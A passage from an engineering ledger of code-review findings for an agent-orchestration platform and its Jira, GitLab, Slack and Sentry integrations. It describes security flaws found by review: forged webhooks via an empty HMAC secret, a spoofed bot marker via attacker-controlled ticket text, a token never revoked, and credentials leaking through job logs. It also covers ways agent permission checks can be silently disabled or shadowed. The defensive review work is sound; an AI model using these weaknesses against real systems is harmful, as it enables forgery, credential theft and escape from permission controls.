the failure rule 11 names, and two WPs in a row is a pattern rather than a slip.

**What the review confirmed as sound**, and it is most of the WP. The `allowedTools` reading is **correct and
in the dangerous direction**: `sdk.d.ts:1443-1449` documents it as an auto-approve list, the shipped bundle
emits `CLAUDE_SDK_CAN_USE_TOOL_SHADOWED` — *"bare `allowedTools` entries auto-approve the whole tool before
the callback is consulted"* — and the reviewer found **no remaining path** that sets it, with a mutation
re-adding it dying on a named test. All four SDK divergences check out against the declarations and the
bundle, so all four amendments to technical/04 are earned. Redaction is on **both** branches everywhere —
`append` is the single door and re-applies the envelope over the redacted copy — with none of the
WP-07-style asymmetry. The clock is injected everywhere, with zero `setTimeout` or `useFakeTimers` in the new
tests. Both SDK workarounds are correct and neither swallows an error. The fixtures are replayed through the
**real** `query()`, so the SDK's own parser validates their shape. Eleven original mutations plus four the
reviewer invented all die by named assertions, none by timeout. The redaction-port merge collapse is complete.

**Q40 — the unredacted session mirror — is a genuine question, not a permissive fait accompli.**
`SessionMirrorPort` has no adapter, no table, no migration and no composition-root wiring; `deps.sessionMirror`
is optional and nothing supplies it, so today's exposure is zero. The reasoning is also right: redacting the
mirror corrupts `resume`. But `session-mirror.ts:15-17` promises "same database, same access control, never
rendered to a human" — an invariant asserted in a comment (rule 3) and unimplemented. **Whoever writes the
adapter owes that access control, and WP-27's take-over export owes the redaction.**

**Also worth keeping:** `fake-spawn`'s "no backpressure" kindness is genuinely inert inside WP-12, because the
SDK owns stdout — but **WP-13 must not run its "large stdout" conformance test against this fake.**

### WP-08 and WP-09 — two providers, and what "recorded" turned out to mean

Both were implemented in parallel from published documentation, because there is no Jira or GitLab instance
to call. Both were told to report **which fixtures are documented and which are invented, separately**, and
both did — that instruction is the reason the two reports can be trusted at all.

**WP-08 (Jira Cloud): 12 documented, 2 composed, 0 invented.** Every fixture carries a `source` block with a
URL and a retrieval date, and the taxonomy lives in `test/fixtures/http/jira-cloud/SOURCES.md`; the two
`composed` entries exist because Atlassian publishes the webhook envelope and the parts but no complete
example. The published HMAC test vector was reproduced exactly. Two Atlassian documentation bugs were found
and recorded (`getIssue`'s `fields.comment` array shape, and an `accoundId` typo). **The contract suite
passed unchanged** — the first evidence that BD-017 actually holds. One mutation is worth keeping: raw probe
detail → "redacts the health probe detail" **initially survived**, because the *executor's* redactor was
masking the adapter's own; the test now composes `noSecretsRedactor()` so only the adapter's can fire. That
is standing rule 4 in a new costume — a guard that appears to work because a *different* guard is covering
for it.

**WP-09 (GitLab): documented fixtures plus five explicitly labelled `kind:"inferred"`** (the 409 body for a
duplicate MR — status documented, body not; a 404 for an unprotected branch; a 404 for a missing file; an
empty pipeline list; a repeat-200 on a second resolve). Coverage type is flagged AMBIGUOUS in the fixture,
because the docs only ever show `null`. `merge_status` maps to the port's three states with
`unchecked|checking|cannot_be_merged_recheck` → **null**, never `false` — the distinction WP-26's rebase gate
depends on — and blocking reasons never map to `false`. Thirty mutations, all killed by named assertions.
Self-managed differences are handled as capability flags rather than version sniffing, with minting failures
turned into a typed `unsupported_capability` that names Premium/Ultimate rather than surfacing a raw 404.

**What WP-09 deliberately did not invent, and this is the right instinct:** `diff_stats` is `null`
everywhere, because GitLab's REST API publishes only `changes_count` (a file count, and `"1000+"` above a
thousand). Filling two of three fields with zeroes would have put invented numbers into `mr.opened` and into
WP-39's coverage deltas. GraphQL's `diffStatsSummary` has them — recorded as discovered work.

**Q40 collided, exactly as predicted.** WP-09 and WP-12 both took it. WP-09 saw the hazard coming and noted
that a collision would conflict on the same hunk, "which is the loud failure" — the orchestrator renumbers at
merge. WP-08 took none.

**WP-09's finding for the pipeline:** `GitProviderPort` has **no protected-branch member**, so WP-15 would
have to down-cast to `GitLabProvider` to reach the gate WP-09 provides. GitHub has the same concept. It
belongs on the port, with a fake and a suite case, in a follow-up.

### A hardware assertion survived seven layers of review, and WP-08 found it

`apps/server/src/sse/hub.test.ts:1101` drives a real `shutdownDrainMs: 20` — twenty actual milliseconds — and
asserts the **exact** 264-frame wire that drains inside it. How many frames drain in twenty real
milliseconds is a property of the machine. This is **standing rule 2**, in the file that earned rules 9, 10,
15 and 16, and it passed three WP-06a review rounds and a follow-up.

It was found only because WP-08's 157 new tests loaded the runner enough to tip it over: red **3 runs in 8**
with those files present, green **8 of 8** with them moved aside. The orchestrator could not reproduce it on
`main` — 6 of 6 green in isolation, 5 of 5 green across the full unit and contract suite — which is the
point worth recording: **`main` was not flaky, it was one work package away from being flaky**, and WP-08,
WP-09 and WP-12 land roughly 560 tests between them.

**Fixed and verified** (`ci-fix`, merged to `main`). The implementer reproduced it before touching anything —
28 spinning processes on a 14-core box, then the file six times: **1 green, 5 red**, wire lengths 55/91/111/210/248
against 268 — and then **injected the timer rather than loosening the assertion**. `withDeadline`'s `setTimeout`
is the hub's only clock, so `vi.useFakeTimers` hands the test the moment the deadline fires; a new
`stalledOnGate` helper drives the chain to the one place it cannot leave and only then advances 20 ms. The
wire is still asserted **exactly and in order**, with a new pre-deadline assertion that the drain stopped
partway, and `withinTurns` bounds the drain in event-loop turns rather than milliseconds. `hub.ts` untouched.

The orchestrator verified it independently under 24 spinning processes: **6 of 6 red before the fix**
(`expected [ …(59) ] to deeply equal [ …(268) ]` and four more like it), **0 of 8 red after**, same load. And
a mutation of the orchestrator's own — making `#resetEveryTopic` return early — still kills three tests by
name, including the repaired one (`expected [ …(265) ] to deeply equal [ …(268) ]`), so the fix did not pull
the test's teeth.

*The rule this earns: a flake you cannot make fail is a flake you cannot prove you fixed — and the honest
verification of a flake fix is the same experiment run twice, once on each side of the change.*

**Two siblings filed rather than fixed**, both in `test/e2e/server/sse.e2e.test.ts`: `:158` uses a 50 ms sleep
as a sufficiency argument, and `:225` waits 100 ms and then makes a **negative** assertion, so it passes
vacuously if the frame is merely late (standing rule 4). Neither is flaking today.

The original fix brief carried three mutations it had to still fail (remove the per-topic `reset`, remove
the off-chain `shutdown`, make the drain unbounded), and with the instruction to prefer **injecting the
shutdown timer** over merely loosening the assertion, since the rest of that suite already runs on an
injected clock. *A flake you cannot make fail is a flake you cannot prove you fixed.*

### WP-08 — review round 1: an empty secret is a valid secret, and the marker was spoofed

**Verdict REQUEST_CHANGES**, one blocking finding, and the review's method is worth copying: it audited the
**provenance labels** against the live vendor documentation before it read a line of adapter code.

**Blocking — a binding with no webhook secret accepts anything.** `createJiraInboundNormaliser({secret:''})`
returns `verify === true` for `HMAC-SHA256('', body)`, which the attacker computes themselves. The only thing
in front of it is `capabilities.webhooks &&` at `index.ts:815`, and **deleting that guard kills 0 of 157
tests**, because the single negative test signs with the *real* secret. One guard covering for a missing one,
with no test able to tell — standing rule 4 in the security-critical place, and a comment asserting an
invariant that does not hold (rule 3). Rule 18 above is what it earned.

**The workpad marker was spoofed.** `addComment(ticket, "…\n\n`[agentic:marker:agentic:workpad]`")` posts a
comment **authored by the bot**, so the author check passes, and the next `upsertWorkpad` adopts and
overwrites it (same `comment_id`, count 2→2). The author check is not wrong, it is insufficient: agent
markdown is **derived from attacker-controlled ticket text** (BD-022), so "the bot wrote it" does not mean
"the platform wrote it".

**And the provenance labels were decoration.** Rewriting one fixture's label to `documented` with
`url: https://example.invalid` passed **157/157**. Rule 17 above. The fix is a reusable provenance test —
WP-09 has just labelled GitLab's fixtures the same way and WP-10 and WP-11 will follow.

**What the audit found when it checked the labels for real**, and this is the reassuring half: `myself` ✓,
`user-search` ✓ (no `emailAddress`, exactly as claimed), `remote-link-created` ✓ — it even reproduces the
documentation's own `/rest/api/issue/` typo — and the `composed` webhook fixture is honestly composed. **Both
claimed Atlassian documentation bugs are real** (`getIssue.fields.comment` is an array; `accoundId` appears
twice on the webhooks page), and the HMAC vector is Atlassian's verbatim. One note overclaimed: a fixture
said `isAvailable:false` "appears in Atlassian's own example", and it does not.

**Also:** an `IntegrationError` is thrown *outside* the executor carrying unredacted provider text, which
makes the WP's own `docs/TODO.md` claim that it "closed this by having no such path" false; and the author
check's `accountId === null` case fails **open** and survives all 157 tests.

**Confirmed sound:** the HMAC comparison is timing-safe and rejects duplicated headers, differing casing,
truncated hex and an empty body; **no path reaches the network outside the executor**; timestamps are
normalised at the adapter edge on every field read; dependencies are MIT and in the right package with
`throwHttpErrors: false` swallowing nothing; capabilities are honestly declared with typed refusals; a
shadow-mode transition performing a *read* is acceptable, since a read is not a mutation under BD-003 and
failing loudly beats a silent bad mapping; and **the contract suite is genuinely unmodified**.

### WP-09 — review round 1: the token that was never revoked, and provenance labels that held

**Verdict REQUEST_CHANGES**, one major. The contrast with WP-08 is the useful part: the same reviewer method
— audit the provenance labels against the live vendor documentation first — found WP-08's labels
**unenforced and one of them overclaiming**, and found **every one of WP-09's five audited labels correct**.
MR `!11`/`!13` verified field-by-field against the live attribute table, the `access_tokens` 201/204/404
responses verbatim, `protected_branches` 404 genuinely undocumented and honestly labelled `inferred`, the MR
409 likewise, and `DETAILED_MERGE_STATUSES` matching all 24 live values. Labelling fixtures honestly is
learnable; asserting the labels is a separate job, and WP-09's are as unasserted as WP-08's were.

**Major — `revokeCredential` DELETEs from the wrong project, and the idempotency hides it.** Minting uses
`request.project`, revocation uses `config.project`. Minted on `other/repo`, the only request sent was
`DELETE /projects/acme%2Fapi/access_tokens/58`; on a real instance that 404s, `notFoundIsNull` absorbs it,
`markRevoked` runs, and **the caller is told revocation succeeded while the push token lives to midnight
UTC**. With the documented `project: null` binding it is worse: revoke always throws and **zero** DELETEs are
ever sent. The idempotency built to absorb "already revoked" is precisely what makes "wrong address"
invisible. Rule 19 above.

**An unknown pipeline status kills the job for ever.** `mapPipelineStatus` throws inside `normalise`, so a
hook carrying `status: "waiting_for_quantum_runner"` raises rather than returning
`ignored('unsupported_event')` — and the port documents no `@throws` there. GitLab adds statuses. Rule 20
above draws the line this WP got backwards in one direction and right in the other: `MR_ACTIONS` already
ignores what it does not know.

**A self-contradictory mergeability result, biased optimistic.** `merge_status: 'can_be_merged'` with
`detailed_merge_status: 'conflict'` yields `{ mergeable: true, hasConflicts: true }` — wrong direction for a
gate WP-26 will trust. And the reviewer's **invented** mutation survived all 251 tests: `hasConflicts ?? null`
→ `?? false` on the `cannot_be_merged` branch, the one place the adapter's kindness is unpinned (rule 12).

**Judgement calls the reviewer made that are worth recording.** The run-time-assembled fake `whsec_` token is
**legitimate** — the plaintext `fake-gitlab-signing-key-do-not-use` sits visibly in the same expression, so
nothing is hidden — but it *is* a general scanner bypass, so the rule is "run-time assembly only when the
fake plaintext is a literal beside it". `diff_stats: null` is the right call, since `changes_count` is a
capped string, **and WP-39 must treat `null` as unknown rather than zero**. The amendment to
`docs/technical/10-testing-strategy.md` holds: `record:http` never existed as a script. `GitProviderPort`'s
missing protected-branch member is a follow-up, not a blocker.

**Also found:** `gitlab-replay.ts`'s `unused()` is **never called**, so a fixture no test exercises goes
unnoticed — rule 17's shape again, an unenforced check being worse than none.

### Notes WP-26 must honour (from WP-09's review)

**`mergeable: true` does not mean "no rebase needed".** WP-09's reviewer enumerated all 864
`merge_status` × `detailed_merge_status` × flag combinations and found zero self-contradictory results — but
two residuals by documented design: `can_be_merged` + `need_rebase` and `can_be_merged` + `commits_status`
both map to `{mergeable: true, hasConflicts: false}`, and a `has_conflicts: true` arriving beside
`can_be_merged` is discarded. **The port therefore cannot express "needs rebase" at all**, so WP-26's rebase
gate must not infer it from `mergeable`. Either the port grows a rebase-state member (with fake and suite
case — standing rule 23) or WP-26 reads `detailed_merge_status` through a provider-specific route and says
so.

### Obligations WP-15 and WP-19 must honour (from WP-12's review)

- **`cost_unreported` is a fault published as an overspend.** When the CLI reports no usable
  `total_cost_usd`, WP-12 stops the run with terminal reason `error_max_budget_usd` and status
  `budget_exceeded`, carrying the distinct name in `RunOutcome.error` and the `run_stopped` row's
  `data.reason`. The reviewer judged this acceptable — `RunTerminalReason` is a closed contract plus a PG
  enum, and BD-010's branch is the same — but **WP-15 must branch on `data.reason`, and WP-19 must not count
  a `cost_unreported` run as spend.** A blind budget stop is not an overspend, and a cost ledger that adds
  it up is wrong in the direction that matters.
- **`managedSettings` has a precondition that can silently disable it.** Binary 2.1.267 @159286173:
  `parentSettingsBehavior` is first-wins by default, so the parent is dropped and admin tiers become the only
  policy source. On a host carrying any admin managed tier — MDM, `/Library/Application Support/ClaudeCode`,
  `/etc/claude-code`, i.e. `local` provider mode on a managed laptop — **`allowManagedPermissionRulesOnly`
  and `allowManagedHooksOnly` both vanish**, and with them the guarantee that project settings cannot shadow
  `canUseTool`. WP-22 and WP-23 should make this an operator check.

### OPEN-QUESTIONS numbering, third collision — the convention holds but the arithmetic is manual

State at the time of writing: `main` has **Q40** (WP-09, branch-pattern scoping on a minted token). WP-12's
branch carries **Q41** — the orchestrator renumbered it from Q40 when merging `main` in, and the conflict
landed on the same hunk, exactly the loud failure WP-09's implementer predicted when taking the number.
WP-10 took **Q42**, having seen Q41 already in use. WP-11 took **Q41** and flagged the collision risk itself.

So WP-11's question must become **Q43** at merge. Three parallel work packages produced three collisions in
one session, every one caught, none silently. **The convention works and is still manual**: the orchestrator
renumbers at merge, and an implementer that says which number it took — as all three did — is what makes the
renumbering cheap. A generated number would be worse; the conflict is the signal.

### WP-10 and WP-11 — what the ledger bought

Both were briefed with the six rules WP-07, WP-08 and WP-09 had paid for, and both applied them **before a
reviewer had to**:

- **WP-10 caught its own rule-10 failure.** Its `opens-a-second-task-thread` mutation *survived*, because
  "same `thread_id`" was satisfied by both branches — so it added `providerCalls()` to the shared suite and
  the mutation then died. That is exactly the defect rule 10 names, found by the author rather than by a
  reviewer.
- **WP-10 added three things to the shared contract suite** (rule 23) rather than to its own tests: unknown
  event ignored-not-thrown, a no-credential binding verifies nothing, and `providerCalls()`. The
  empty-credential case is rule 18, which WP-08 shipped as a live hole — closed here before it existed.
- **WP-10 left one mutation alive and labelled it** (rule 22): the `v0=` prefix check is unreachable behind
  the whole-string compare.
- **WP-11 canaried its mutation harness three ways** — planted failure → DEAD-with-name, comment change →
  ALIVE, syntax error → RUNNER-ERROR — and reports it *first misread an `afterAll` failure and was
  recalibrated* (rule 21, earned twice before it).
- **WP-11 left one mutation alive and corrected the claim instead of the code**: `BigInt` → `Number` on
  nanoseconds produces identical millisecond output, so the docblock and test were overclaiming and were
  narrowed (rule 3).
- **WP-11 declared `agentTooling: null` for Sentry** rather than guessing a CLI contract — MCP is OAuth-only
  and `sentry-cli` has no issue commands — the same call WP-08 made and the right one.

Both also refused to invent: WP-11's `SOURCES.md` files list pages that produced **no** fixture, including
`docs.sentry.io/api/events/` (21 endpoints) and `mcp.sentry.dev`, so a later reader can tell "checked and
unused" from "never looked".

### CI does not run `ignored:check`

Found by WP-10 while wiring the new NUL guard into CI's lint job: **`ignored:check` runs inside `verify` but
in no CI job of its own.** That guard has already caught two live defects — `apps/server/src/data/` swallowed
by an unanchored `data/` rule at WP-06, and the nested-worktree walk at WP-06a — so it is worth a gate rather
than a local-only check. Fold it into the next `ci-fix` alongside the NUL guard.

### CONFIRMED with exploits — gitlab and jira leak, and the follow-up brief is written

WP-11's round-2 reviewer verified both claims by building each provider through its **real registration**
with `noSecretsRedactor()` and planting the binding's own credential:

- **gitlab** (`packages/integrations/src/providers/gitlab/provider.ts:223`): `getJobLog` returned
  `"PRIVATE-TOKEN: glpat-PLANTED-…"` **verbatim**. It uses the injected redactor but composes **no**
  `bindingSecretRedactor`, so the provider's own credential is not in the set being redacted. Reachable
  through `gitlabProviderRegistration.create`.
- **jira** (`packages/integrations/src/providers/jira-cloud/index.ts:826,839`): the redactor is applied to
  `HealthProbe.detail` **only**. Ticket and comment text reach the caller unredacted, and
  `action-executor.ts:491` redacts the **audit row**, not the returned value — so the executor does not
  compensate.

**The fix, after WP-11 merges** (it would conflict now): compose `input.redactor` with a
`bindingSecretRedactor` over each provider's own secrets, exactly as Slack now does, and prove it with the
test shape that found this — build through the real registration, disarm the caller's redactor with
`noSecretsRedactor()` so only the adapter's own can fire, plant the credential in **every** emitted string,
and assert both each field and the serialised whole, failure branches included.

**Note for whoever does it:** WP-08's own review already caught the *test-level* version of this — a
"redacts the health probe detail" mutation that survived because the executor's redactor masked the
adapter's missing one — and fixed the test without noticing that production had the same hole. A test that
composes `noSecretsRedactor()` is the instrument that distinguishes them, and it now exists.

### Rule 35's shape found twice more, on `main` — gitlab and jira take a redactor and barely use it

Reported by the agent that reconciled Slack against WP-11's required-redactor change, which was the first to
see all five providers side by side:

> Still unused on `main`: **gitlab composes nothing** — `noSecretsRedactor()` disarms its job-log tail;
> **jira applies its redactor to `HealthProbe.detail` only.**

Both are already merged, so if the claim holds these are live defects of exactly the class rule 31 names,
and rule 35 explains why nothing caught them: making `ProviderCreateInput.redactor` required proves each
provider is *handed* a redactor, not that it *uses* one. The WP-11 round-2 reviewer has been asked to verify
both precisely — what reaches an output unredacted, and whether it is reachable through the executor or only
directly.

**If confirmed, the fix is a follow-up after WP-11 merges** (it would conflict otherwise), and it should
follow the pattern WP-11 settled on and Slack now implements: compose `input.redactor` with a
`bindingSecretRedactor` over the provider's own secrets, redact **before** any cap so a cut cannot leave a
fragment, redact at the transport over both request and response documents *above* the success test, and
prove it with a test that plants a secret in **every** emitted string and asserts both each field and the
serialised whole — failure branches included.

**The general lesson is worth stating separately from the rules**, because it is about how this session
found the defect at all: it took a reader with **all five providers in one tree** to notice that two of them
were disarmed. Each provider's own review saw only its own adapter, and each was correct about what it
looked at. Some defects are only visible after a merge, which is an argument for the merge itself being a
review surface rather than a formality.

### ci-fix — the flaky assertion could not have detected the defect it named

CI failed on a **docs-only** commit: `expected 121.003307 to be less than or equal to 121`, in
`pg-boss-jobs.integration.test.ts` — "does not delay the leading coalesced job — it is a throttle, not a
debounce". The orchestrator briefed it as a load problem, following the SSE precedent. **That was wrong, and
measuring found the real cause.**

Load was a red herring: 6 of 6 green at load average 39. The trigger is **slot phase**.
`getDebounceStartAfter` (`pg-boss/dist/manager.js:1078`) returns whole seconds — rest of slot, plus one — so
a burst landing in the first second of a 120-second slot gets exactly 121, and `lead ≤ 121` then required
the second enqueue's round trip to take **zero** time. About **0.8 % of runs on any machine**, load or no
load. Aligning a burst to a slot boundary made it **0 pass / 3 fail** with the identical assertion text CI
produced; the same alignment after the fix is **3/3**.

**And the assertion was pointing the wrong way.** The flaking line already *was* the leader-versus-follower
comparison — but as an **upper** bound, and an upper bound cannot detect a debounce, because a debounce makes
the lead **smaller**. So the assertion was simultaneously fragile on hardware and incapable of catching the
defect in its own name. It is now a **lower** bound, `lead >= trailingDelay`: the leader is runnable at its
own creation, so the lead is the database-recorded margin plus round trip and can never fall below the
margin, on any hardware. Rows are ordered by `created_on` rather than by the column under test. The debounce
mutation dies `expected 120 to be +0`.

**Siblings found and left, with their evidence**, so the next reader does not have to re-derive them:
`test/contract/support/jobs-contract-suite.ts:165` (`ranAt − startAfter ≤ 8000`, and it runs in the
integration tier); `test/integration/events/outbox.integration.test.ts:155` (`elapsed < 10_000` against a
500 ms timeout); `pg-boss-jobs.integration.test.ts:268` (a database `start_after` compared against host
`Date.now() + 3_000_000`). Adjacent class — **sleep, then a negative assertion, vacuous when slow**:
`broadcast.integration.test.ts:98`, `pg-boss-jobs.integration.test.ts:236`, and the two already filed at
`sse.e2e.test.ts:158,225`.

### `ignored:check` fails on a Finder artefact, and the fix must not become an allow-list

Merging the pg-boss `ci-fix` turned `main` red — not from the change, but because macOS had left
`.DS_Store` files in `.claude/`, `apps/`, `docs/` and the repository root during this session's
filesystem work. `check-ignored.mjs` reported all three as *"`.gitignore` hides 3 source file(s)"*.

They are not source, and the guard cannot tell. WP-08's fixture-provenance walk already faced the identical
question and skips exactly `.DS_Store` and `Thumbs.db`, so the two guards disagree about what an OS artefact
is. The orchestrator deleted the files to unblock the merge; **that is hygiene, not a fix, and they will
come back the next time anyone opens a folder in Finder.**

The fix needs care, because "add a skip list" is precisely the shape rule 7's corollary warns about — WP-06a
closed a hand-maintained scope by adding `IGNORABLE_ROOT_FILES`, an allow-list that *suppresses failures*,
and the reviewer rejected it. The distinction worth holding: skipping a file because **git itself** says it
is not source (an attribute, an ignore rule authored for that purpose) is derivation; skipping it because a
constant in our script names it is drift. A defensible middle is to skip only names that are OS metadata by
universal convention, name them in one place shared with the provenance walk, and **fail loudly on anything
else** — the two guards should not carry two different answers to the same question.

**Fixed at `e83a881`, and the interesting part is that measuring rejected the more elegant option.** The
obvious improvement is to stop naming files and *derive* source-ness instead: treat a file as source when
the repository already tracks its extension, which is exactly the trick `check-ignored.mjs` already uses for
root-level files and which needs no list at all. Measured before adopting it (rule 27): this repository
tracks **three** extension-less files — `LICENSE`, `NOTICE`, `test/fixtures/runlet/fake-claude-cli` — and
**no `Dockerfile` at all**, so the first Dockerfile WP-22 adds would be invisible to the derivation. That
trades a *loud* false positive for a *quiet* false negative of precisely the class the guard exists to catch
(`data/` once hid `apps/server/src/data/` while every local check stayed green). The name list only ever
*removes* failures for files git would not track anyway; a derivation would have removed failures for files
git very much should track. **The elegant rule was the unsafe one, and only counting told me so.**

While measuring it, a second thing surfaced: the guard was already inconsistent *with itself*. Four planted
`.DS_Store` files produced three reports — the root-level one was silent, because `rootFileExtensions`
filters out the empty extension while `walk()` applied no filter at all. The same filename was source in
`apps/` and not source at the root, and nobody had noticed because only the noisy half ever fired.

### WP-11 — three rounds spent, and the round-3 finding carved out as WP-11a

**Round 3 returned REQUEST_CHANGES**, so WP-11's bounded three review rounds are used. The protocol says a
WP is then marked BLOCKED — but the ledger already has a better precedent for this exact situation, set by
**WP-02a** and **WP-06a**: *the round-3 finding is a newly discovered instance, not a repeated failure to fix
the same thing*, so it is carved into its own work package with its own rounds rather than parking the whole
package.

**The difference from WP-06a, and why WP-11 does not merge yet.** WP-06 was merged with its layer carved out
because a working server skeleton was blocking WP-07 and WP-20. **Nothing is waiting on WP-11** — the five
providers are leaves — and the finding is a 200 MB blow-up into a context pack and an `integration_actions`
row. Merging that to avoid an awkward status would be the wrong trade. WP-11 merges when WP-11a is done.

**The blocking finding.** `sentry/mapping.ts:258-259` emits `category` and `level` raw, both
`z.string().nullish()`. With 2 MB fields, `mapBreadcrumbs` produced **100,027,762 bytes** at the shipped
defaults (`max_breadcrumbs = 25`, `max_breadcrumb_bytes = 1024`); the figure first written here, **200,106,301
bytes**, was taken at doubled caps and did not reproduce (rule 39). Either way `message` was correctly cut
and the other two went straight through at 2,000,000 each, with no marker and nothing setting `truncated`. It also falsifies `sentry/config.ts:73-77`, which claims "every field the adapter emits is
bounded by a named cap… the sum of them" — an authoritative statement that is simply untrue, which docs-win
makes worse rather than better.

**Why three rounds missed it, and this is rule 37**: every round audited the *call sites that cap things*
rather than the *members of the type being emitted*. Round 3 even stated the sweep was complete — "the one
string routing around every cap was Sentry's health probe" — and that claim was false. Enumerating
`BreadcrumbOut`'s fields finds it in a minute; reading the capping code does not.

**Also found:** `sentry/mapping.ts:300` uses `key in record`, which walks `Object.prototype` (so tags named
`toString`, `constructor` or `__proto__` vanish) and compares the **raw** key against **capped** keys, so a
post-cap collision keeps the **last** while its own docblock — and `loki/provider.ts:423`, citing it as
precedent — says the first. Rule 38.

**And a stale reference that is not WP-11's**: `slack/http.ts:5` and `test/fixtures/http/slack/SOURCES.md:112`
cite **Q41** for "not using `@slack/web-api`"; that question is **Q42**. WP-10 went stale after its own
renumber, and it is already on `main`.

**What round 3 confirmed sound**, so WP-11a need not revisit it: the marker-inside-the-bound reasoning holds
under a marker-shaped suffix, the exact bound, one byte over, a multi-byte straddle and double application —
output is always ≤ `maxBytes` and a second pass is identical, with the reservation sized for the maximum
possible count so the real marker cannot overflow. Divergence 9 carries a positive assertion on both methods;
`queryRange` and `series` both route through `capLabelSet`; the collision count is right and the marker leaks
no key; all seven `Q43` edits are correct and `Q40`–`Q43` each appear once. **Nine of nine mutations died**,
including two the reviewer invented.

### WP-13 — the research report separates measured from inferred, and two mutations moved the code

**Built and in review.** Frame protocol as an 8-byte prefix plus a JSON header, validated by a **strict** zod
discriminated union at *both* edges and probed from JavaScript literals through `unknown` (rule 14), with
`exit.code`/`exit.signal` and `cred.reply.credential` **required-and-nullable** so a missing field is never
zero (rule 16), and a per-state accept-list on each side so a `spawn` reaching the runner or a `stdout`
reaching the shim is refused *though it parses*.

**`cred.get` is designed so the shim holds nothing**: it generates the `request_id` the runner sees, carries
no allow-list and no credential, and only brokers between `spawn` and child exit, capped per run and per
concurrency.

**Kill-on-disconnect is proved by process state rather than by a spy** — the child ignores `SIGTERM`, so
`teardownSignals` is `['SIGTERM']` at grace−1 and `['SIGTERM','SIGKILL']` after, and the process is then
confirmed gone with `process.kill(pid, 0)`. Injected clock, no upper-bound timing anywhere (rules 2 and, from
the pg-boss ci-fix, the reason an upper bound could not detect the defect it named).

**Two mutation survivors changed the code rather than the story, and both are rule 4:**
- `killGraceMs → 0` **survived** `processIsAlive` — the assertion could not see the difference, so the fix was
  to assert `teardownSignals` instead.
- Removing the *adapter's* `runletFrameSchema.parse` **survived, because the shim caught it** — one guard
  covering for another, exactly the shape WP-08's health-probe mutation had. Fixed with a raw-server test,
  *"never puts the bad frame on the wire"*, which isolates the adapter from its downstream guard.

**The research report** (`docs/research/12-run-shim-verification.md`, Docker **29.7.2** / API 1.55) does what
the provider WPs did for fixtures: it separates **measured** from **inferred**. Measured — `volume-subpath`
isolation and its *loud* failure on a missing sub-path, embedded DNS resolving names but not the internet
with no default route, SDK `query()` end to end through the shim in a hardened container
(`--user 1000 --cap-drop ALL --read-only --network none --init`) driven from a second container, and a killed
runner leaving no agent behind. Inferred — the `platform-runtime` bundle, `tini`, socket uid matching, the
egress sidecar, Kubernetes, tmpfs volumes.

**What it leaves for others, stated rather than faked:** WP-14's launcher must create and `chown`
`<ctl>/<run-id>/` before start, because the daemon refuses a missing sub-path, and must run the runner as
uid 1000 (the socket is `0600`, Q45); WP-22 must bundle `apps/runlet` to a single file and re-run
`scripts/runlet-container-check.mjs` against the real image. Session-store resume after a runner restart is
WP-15's half.

### WP-15 — the loop runs, and four defects only running it could find

**The acceptance criterion is met**: `verify:e2e` walks one feature ticket and one bug ticket from
`ticket.matched` to `task.completed` against a migrated PostgreSQL 18, with the real event store, the real
priority dispatcher, the real `IntegrationActionExecutor` in front of fake providers, the real in-memory
`Jobs` adapter and `FakeClaudeRunner`. Both templates end `done`, with no escalation.

**Four defects the loop found, each invisible to every tier before it.** Every one is the same shape — two
components tested against themselves and never against each other:

1. **Every aggregate opened its stream at `stream_seq` 0**, and migration 0005's
   `events_stream_seq_positive` is `check (stream_seq >= 1)`. The domain was tested against itself and the
   event store against hand-built fixtures whose `streamSeq` the fixture chose; WP-15 is the first code that
   appends an aggregate's events to a store. `FIRST_STREAM_SEQ` now names it, and the two model suites assert
   contiguity *from* it.
2. **`state === 'active'` as a guard strands a task at the retrospective.** product/04's task states are not
   one per stage: `ready_for_merge`, `merged` and `retro` are states the pipeline moves through under its own
   power. The guard appeared in three places (the stage executor's re-validation, the stage-completed handler,
   the gate job) and in the *aggregate* (`completeStage`). `isRunnableTaskState` says what was meant: not
   stopped by a human.
3. **A convergence signature stored in `task_stages.outcome` is overwritten by the very transition it exists
   to stop.** `outcome` is written by whichever path closes the row — the executor writes the verdict, the
   transition writes `returned` — so three identical CI failures never converged. Migration 0012 gives it a
   column nothing else writes.
4. **A gate that answers "not yet" and re-enqueues itself with no delay is a spin**: five checks in
   milliseconds, and the task parked for a human before the pipeline it was waiting for had started. The
   re-check is a `startAfter` now (`GATE_RECHECK_MS`), and the test moves the clock to observe it.

**Two more in the test harness rather than the product**, and both are the same class — a failure the harness
could not see:

- the `IntegrationActionExecutor` was given a virtual timer nothing advanced, so the first rate-limited call
  *hung* the suite instead of failing it (`autoAdvance` now). A hang is the worst failure mode a suite has,
  because it reports the timeout rather than the cause;
- **a chained dispatch's failure is invisible in the sweep report.** `SweepReport.failed` counts the event the
  sweep took off the queue; an event three links down the chain that fails leaves *its* row queued with a
  backoff, and the sweep that follows reports `scanned: 0`. The e2e read that as "the pipeline settled" and
  asserted the state it had stopped in. The harness now reads `event_dispatch.error` after every sweep and
  reports the handler's error instead — which is how the missing seeded ticket was found in one run rather
  than by bisecting handlers. The same shape as the job-failure wrapper beside it: **a test harness has to
  surface the failure of every asynchronous thing it drives, or it reports the symptom.**

**The obligations, discharged.** `cost_unreported` branches on the `run_stopped` row's `data.reason`, not on
the status — and because the runner takes one sink for every run, the reason arrives through
`RunStopReasons`, a decorator the composition root installs once. The MR batcher is `stately` +
`singletonKey: 'mr:<iid>'` + `startAfter`, never `coalesce`, and re-reads every unresolved thread on wake;
three tests drive its three endings. Enqueues happen **after commit** through a new
`HandlerContext.afterCommit`, whose at-most-once caveat is demonstrated by a test that kills the process
between the commit and the callback. `isBranchProtected` is on `GitProviderPort` with a fake, a shared-suite
case and a GitLab fixture — no down-cast. The gate schema refuses a gate that names neither `on` nor
`command` unless it is one of the three the platform evaluates itself.

**What was cut, and why.**

- **The `spike` template.** It ends at a human with no MR, so it exercises none of the loop; the WP row names
  feature, bug and chore, and all three ship.
- **The `librarian` stage** technical/12's example template carries. It is WP-18's pipeline, and a stage whose
  executor does not exist would park every task one step short of `done`.
- **The CI gate's error block.** product/04 S4 wants "the failing job's error block only" in the return; this
  returns the failing **job names** from the event. Fetching the log is `getJobLog`, whose redaction
  obligation is **Q55** — a run-scoped credential the binding redactor cannot know — and calling it before
  that is decided would put a token in a return reason. The gate is honest about what it read.
- **Probation mode** (BD-006: approval for the first 5 tasks). Plan approval is implemented as
  `never | above_size | always` with an `L` threshold; probation needs a per-project completed-task count that
  WP-30's autonomy dial owns.
- **`command` gates.** A gate with a `command` needs a workspace; the evaluator returns `unsupported` and the
  task escalates with a brief naming it, rather than passing a gate nothing ran.

